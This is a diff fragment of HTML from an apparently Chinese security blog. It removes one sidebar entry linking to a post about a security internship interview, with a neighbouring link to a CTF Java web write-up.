@@ -1179,27 +1200,6 @@ Thinkphp工具一把
                 
               </div>
               <a class="post-title" href="/2026/03/19/alictf-2025-web-java/">Alictf 2026 javaweb</a>
-            </div>
-          </div>
-        
-          <div class="aside-list-item">
-            
-            
-            
-
-            <div class="post-img-box">
-              <a href="/2026/03/13/wo-de-an-quan-mian-shi-just-shi-xi/" class="post-img " style="background-size: cover; 
-                background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8192.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8192.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-              </a>
-            </div>
-            <div class="post-date-title">
-              <div>
-                
-                  <span class="post-date">03-13</span>
-                
-              </div>
-              <a class="post-title" href="/2026/03/13/wo-de-an-quan-mian-shi-just-shi-xi/">我的安全面试——实习</a>
             </div>
           </div>
         
